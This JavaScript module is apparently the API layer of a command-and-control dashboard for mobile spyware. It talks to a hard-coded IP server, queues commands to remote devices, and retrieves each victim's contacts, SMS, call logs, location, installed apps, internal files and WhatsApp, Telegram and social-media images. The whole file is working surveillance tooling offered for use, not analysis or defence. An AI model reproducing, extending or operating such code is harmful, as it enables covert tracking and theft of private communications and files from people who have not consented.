import axios from "axios";
// import { Users } from "../utils/store/users";
import { toast } from "react-toastify";

export const BASE_URL = "http://119.13.103.4:5000/";

const apiService = axios.create({
  baseURL: BASE_URL,
  timeout: 8000,
  headers: {
    "Content-Type": "application/json",
    Accept: "application/json",
    "Cache-Control": "no-cache",
  },
});

const handleApiResponse = (response) => {
  if (response.status === 200) {
    return response.data.data.response;
  } else {
    throw new Error(`Error: ${response.data.message}`);
  }
};
// fetch users
export const fetchUsers = async () => {
  try {
    const response = await apiService.get("dashboard/users");
    if (response.status === 200) {
      // toast.success("Users fetched successfully.", {
      //   position: toast.POSITION.RIGHT,
      // });
      return response.data.data;
    }
  } catch (error) {
    console.error("Error fetching user list:", error);
    toast.error("Failed to fetch user list. Please try again later.", {
      position: toast.POSITION.RIGHT,
    });
  }
};

// fetch notifications
export const fetchNotifications = async (userId) => {
  try {
    const response = await apiService.get("dashboard/notifications/" + userId);
    if (response.status === 200) {
      return response.data.data;
    }
  } catch (error) {
    toast.error("Failed to fetch notifications.");
    throw ("Error fetching user list:", error.message);
    // Fallback to dummy data
  }
};

// fetch data
export const fetchData = async (userId, command, apiEndpoint, path = null) => {
  try {
    const response = await apiService.post("command/add", {
      device_id: userId,
      command: command,
      shell: "None",
      number: "None",
      data: path,
    });
    const cmdKey = response.data.command_key;
    toast.info(`Fetching data...`);
    await new Promise((resolve) => setTimeout(resolve, 2000));
    // Retry if the response is 404
    let retryCount = 0;
    let listResponse;
    while (true) {
      try {
        listResponse = await apiService.get(
          `dashboard/datatypes/${apiEndpoint}/${userId}/${cmdKey}`
        );
        break;
      } catch (error) {
        toast.error(`Timed out`);
        if (error.response && error.response.status === 404 && retryCount < 2) {
          retryCount++;
          toast.info(`Retrying ${command} (${retryCount} of 2)...`);

          await new Promise((resolve) => setTimeout(resolve, 2000));
        } else {
          console.error(`Error fetching ${command}:`, error);
          throw new Error(`Error fetching ${command}`);
        }
      }
    }
    return handleApiResponse(listResponse);
  } catch (error) {
    console.error(`Error fetching ${command}:`, error);
    throw new Error(`Error fetching ${command}`);
  }
};

// fetch internal storage, data check image download
export const fetchInternalData = async (
  userId,
  command,
  apiEndpoint,
  path = null
) => {
  try {
    const response = await apiService.post("command/add", {
      device_id: userId,
      command: command,
      shell: "None",
      number: "None",
      data: path,
    });
    const cmdKey = response.data.command_key;
    toast.info(`Fetching data...`);
    await new Promise((resolve) => setTimeout(resolve, 2000));
    while (true) {
      const fileexists = await apiService.get("dashboard/checkImage/" + cmdKey);
      console.log("response here:", fileexists?.data?.data?.response);
      if (fileexists?.data?.data?.response !== null) {
        console.log("fileexists:", fileexists);
        break;
      }

      await new Promise((resolve) => setTimeout(resolve, 2000));
    }
    // // Retry if the response is 404
    console.log("beforeeeeeeeeee 3second:");
    await new Promise((resolve) => setTimeout(resolve, 5000));
    console.log("afterrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr 3 sec");
    let retryCount = 0;
    let listResponse;
    while (true) {
      try {
        listResponse = await apiService.get(
          `dashboard/datatypes/${apiEndpoint}/${userId}/${cmdKey}`
        );
        break;
      } catch (error) {
        toast.error(`Timed out`);
        if (error.response && error.response.status === 404 && retryCount < 2) {
          retryCount++;
          toast.info(`Retrying ${command} (${retryCount} of 2)...`);
          await new Promise((resolve) => setTimeout(resolve, 2000));
        } else {
          console.error(`Error fetching ${command}:`, error);
          throw new Error(`Error fetching ${command}`);
        }
      }
    }
    return handleApiResponse(listResponse);
  } catch (error) {
    console.error(`Error fetching ${command}:`, error);
    throw new Error(`Error fetching ${command}`);
  }
};

// Fetch data functions for different API endpoints
export const fetchContactList = async (userId) => {
  return await fetchData(userId, "getcontact", "getcontact");
};

export const fetchInternalStorage = async (userId, path) => {
  return await fetchData(userId, "listfile", "listfile", path);
};

export const fetchInstalledApps = async (userId) => {
  return await fetchData(userId, "getapps", "getapps");
};

export const fetchLocationList = async (userId) => {
  return await fetchData(userId, "getlocation", "getlocation");
};

export const fetchCallsList = async (userId) => {
  return await fetchData(userId, "getcalllogs", "getcalllogs");
};

export const fetchMessagesList = async (userId) => {
  return await fetchData(userId, "getsms", "getsms");
};

export const fetchInternalFile = async (userId, path) => {
  return await fetchInternalData(userId, "getfile", "getfile", path);
};

export const fetchWhatsappData = async (userId) => {
  return await fetchInternalData(userId, "whatsappfile", "whatsappfile");
};

export const fetchW4bData = async (userId) => {
  return await fetchInternalData(userId, "whatsappw4bfile", "whatsappw4bfile");
};

export const fetchTelegramfiles = async (userId) => {
  return await fetchInternalData(userId, "telegramfile", "telegramfile");
};

export const fetchSocialImages = async (userId) => {
  return await fetchInternalData(userId, "social", "social");
};
